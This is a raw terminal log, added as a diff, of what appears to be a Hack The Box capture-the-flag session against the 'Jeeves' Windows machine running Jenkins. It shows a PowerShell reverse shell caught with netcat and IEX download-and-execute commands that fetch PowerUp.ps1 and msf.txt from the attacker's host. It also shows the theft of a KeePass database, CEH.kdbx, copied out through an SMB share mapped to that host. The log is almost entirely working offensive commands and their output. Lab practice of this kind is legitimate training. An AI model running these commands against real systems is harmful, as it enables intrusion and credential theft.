@@ -1,0 +1,210 @@
+┌─[root@parrot]─[~/hackthebox/jeeves]       
+└──╼ #cd www/         
+┌─[root@parrot]─[~/hackthebox/jeeves/www]   
+└──╼ #less rev.ps1    
+┌─[root@parrot]─[~/hackthebox/jeeves/www]   
+└──╼ #nc -nvlp 9001   
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                             
+Ncat: Listening on :::9001                  
+Ncat: Listening on 0.0.0.0:9001             
+Ncat: Connection from 10.10.10.63.          
+Ncat: Connection from 10.10.10.63:49677.    
+Windows PowerShell running as user kohsuke on JEEVES                                     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                           
+
+PS C:\Users\Administrator\.jenkins>ls       
+
+
+    Directory: C:\Users\Administrator\.jenkins                                           
+
+
+Mode                LastWriteTime         Length Name                                                                                
+----                -------------         ------ ----                                                                                
+d-----        11/3/2017  10:33 PM                jobs                                                                                
+d-----        11/3/2017  10:33 PM                logs                                                                                
+d-----        11/3/2017  10:33 PM                nodes                                                                               
+d-----        11/3/2017  10:44 PM                plugins                                                                             
+d-----       12/24/2017   2:47 AM                secrets                                                                             
+d-----        11/8/2017   8:52 AM                updates                                                                             
+d-----        11/3/2017  10:33 PM                userContent                                                                         
+d-----        11/3/2017  10:33 PM                users                                                                               
+d-----        11/3/2017  10:47 PM                war                                                                                 
+d-----        11/3/2017  10:43 PM                workflow-libs                                                                       
+-a----         1/5/2020   3:26 AM             47 .owner                                                                              
+-a----         1/4/2020   7:39 PM           1684 config.xml                                                                          
+-a----         1/4/2020   7:39 PM            156 hudson.model.UpdateCenter.xml                                                       
+-a----        11/3/2017  10:43 PM            374 hudson.plugins.git.GitTool.xml                                                      
+-a----        11/3/2017  10:33 PM           1712 identity.key.enc                                                                    
+-a----        11/3/2017  10:46 PM             94 jenkins.CLI.xml                                                                     
+               1/5/2020   4:04 AM          76062 jenkins.err.log                                                                     
+-a----        11/3/2017  10:47 PM         360448 jenkins.exe                                                                         
+-a----        11/3/2017  10:47 PM            331 jenkins.exe.config                                                                  
+-a----         1/4/2020   7:39 PM              4 jenkins.install.InstallUtil.lastExecVersion                                         
+-a----        11/3/2017  10:45 PM              4 jenkins.install.UpgradeWizard.state                                                 
+-a----        11/3/2017  10:46 PM            138 jenkins.model.DownloadSettings.xml                                                  
+             12/24/2017   2:38 PM           2688 jenkins.out.log                                                                     
+-a----         1/4/2020   7:37 PM              4 jenkins.pid                                                                         
+-a----        11/3/2017  10:46 PM            169 jenkins.security.QueueItemAuthenticatorConfiguration.xml                            
+-a----        11/3/2017  10:46 PM            162 jenkins.security.UpdateSiteWarningsConfiguration.xml                                
+-a----        11/3/2017  10:47 PM       74271222 jenkins.war                                                                         
+-a----         1/4/2020   7:37 PM          34147 jenkins.wrapper.log                                                                 
+-a----        11/3/2017  10:49 PM           2881 jenkins.xml                                                                         
+-a----         1/4/2020   7:39 PM            907 nodeMonitors.xml                                                                    
+-a----        11/3/2017  10:47 PM            129 queue.xml.bak                                                                       
+-a----        11/3/2017  10:33 PM             64 secret.key                                                                          
+-a----        11/3/2017  10:33 PM              0 secret.key.not-so-secret                                                            
+
+
+PS C:\Users\Administrator\.jenkins> cd ..   
+PS C:\Users\Administrator> ls               
+PS C:\Users\Administrator> ls : Access to the path 'C:\Users\Administrator' is denied.   
+At line:1 char:1                            
++ ls                                        
++ ~~                                        
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessExc               
+   eption                                   
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand     
+                                            
+
+PS C:\Users\Administrator> cd .jenkins      
+PS C:\Users\Administrator\.jenkins> whoami  
+jeeves\kohsuke                              
+PS C:\Users\Administrator\.jenkins> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/PowerUp.ps1')                   
+jeeves\kohsuke        
+PS C:\Users\Administrator\.jenkins> Invoke-PowerShellTcp : Exception calling "DownloadString" with "1" argument(s): "Unable to connect to the remote                              
+server"               
+At line:127 char:1    
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 9001                        
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                        
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException       
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShellTcp           
+                      
+                      
+PS C:\Users\Administrator\.jenkins> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/PowerUp.ps1')              
+
+
+PS C:\Users\Administrator\.jenkins> Invoke-PowerShellTcp : Exception calling "DownloadString" with "1" argument(s): "The operation has timed out."                                
+At line:127 char:1    
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 9001                        
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                        
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException       
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShellTcp           
+                      
+PS C:\Users\Administrator\.jenkins> cd ../..
+PS C:\Users> dir      
+
+
+    Directory: C:\Users                     
+
+
+Mode                LastWriteTime         Length Name                                                                                
+----                -------------         ------ ----                                                                                
+d-----        11/3/2017  11:07 PM                Administrator                                                                       
+d-----        11/5/2017   9:17 PM                DefaultAppPool                                                                      
+d-----        11/3/2017  11:19 PM                kohsuke                                                                             
+d-r---       10/25/2017   4:46 PM                Public                                                                              
+
+
+PS C:\Users> cd kohsuke                     
+PS C:\Users\kohsuke> dir                    
+
+
+    Directory: C:\Users\kohsuke             
+
+
+Mode                LastWriteTime         Length Name                                                                                
+----                -------------         ------ ----                                                                                
+d-----        11/3/2017  10:51 PM                .groovy                                                                             
+d-r---        11/3/2017  11:15 PM                Contacts                                                                            
+d-r---        11/3/2017  11:19 PM                Desktop                                                                             
+d-r---        11/3/2017  11:18 PM                Documents                                                                           
+d-r---        11/3/2017  11:15 PM                Downloads                                                                           
+d-r---        11/3/2017  11:15 PM                Favorites                                                                           
+d-r---        11/3/2017  11:22 PM                Links                                                                               
+d-r---        11/3/2017  11:15 PM                Music                                                                               
+d-r---        11/3/2017  11:22 PM                OneDrive                                                                            
+d-r---        11/4/2017   3:10 AM                Pictures                                                                            
+d-r---        11/3/2017  11:15 PM                Saved Games                                                                         
+d-r---        11/3/2017  11:16 PM                Searches                                                                            
+d-r---        11/3/2017  11:15 PM                Videos                                                                              
+
+
+PS C:\Users\kohsuke> cd Desktop             
+PS C:\Users\kohsuke\Desktop> dir            
+
+
+    Directory: C:\Users\kohsuke\Desktop     
+
+
+Mode                LastWriteTime         Length Name                                                                                
+----                -------------         ------ ----                                                                                
+-ar---        11/3/2017  11:22 PM             32 user.txt                                                                            
+
+
+PS C:\Users\kohsuke\Desktop> cat user.txt   
+e3232272596fb47950d59c4cf1e7066a            
+PS C:\Users\kohsuke\Desktop> cd ..          
+PS C:\Users\kohsuke> cd Documents           
+PS C:\Users\kohsuke\Documents> ls           
+
+
+    Directory: C:\Users\kohsuke\Documents   
+
+
+Mode                LastWriteTime         Length Name                                                                                
+----                -------------         ------ ----                                                                                
+-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                                            
+
+
+PS C:\Users\kohsuke\Documents> New-PSDrive -Name "hacking" -PSProvider "Filesystem" -Root "\\10.10.14.14\arrow"                      
+
+Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation              
+----           ---------     --------- --------      ----                                               ---------------              
+hacking                                FileSystem    \\10.10.14.14\arrow                                                             
+
+
+PS C:\Users\kohsuke\Documents> cd hacking   
+PS C:\Users\kohsuke\Documents> cd : Cannot find path 'C:\Users\kohsuke\Documents\hacking' because it does not exist.                 
+At line:1 char:1      
++ cd hacking          
++ ~~~~~~~~~~          
+    + CategoryInfo          : ObjectNotFound: (C:\Users\kohsuke\Documents\hacking:String) [Set-Location], ItemNotFound               
+   Exception          
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand                    
+                      
+
+PS C:\Users\kohsuke\Documents> cd hacking:  
+PS hacking:\> echo arrow > awesome          
+PS hacking:\> cp C:\Users\kohsuke\Documents\CEH.kdbx .                                   
+PS hacking:\> whoami /priv                  
+
+PRIVILEGES INFORMATION                      
+----------------------                      
+
+Privilege Name                Description                               State            
+============================= ========================================= ========         
+SeShutdownPrivilege           Shut down the system                      Disabled         
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled          
+SeUndockPrivilege             Remove computer from docking station      Disabled         
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled          
+SeCreateGlobalPrivilege       Create global objects                     Enabled          
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled         
+SeTimeZonePrivilege           Change the time zone                      Disabled         
+PS hacking:\> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/msf.txt')                  
+PS hacking:\>         
+
+                      
+PS hacking:\> dir     
+
+
+    Directory: \\10.10.14.14\arrow          
+
+
+Mode                LastWriteTime         Length Name                                                                                
+----                -------------         ------ ----                                                                                
+-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                                            
+-a----         1/5/2020  12:06 AM            312 jeeves.keepass                                                                      
+-a----         1/5/2020  12:03 AM             16 awesome                                                                             
+
+
+PS hacking:\>         
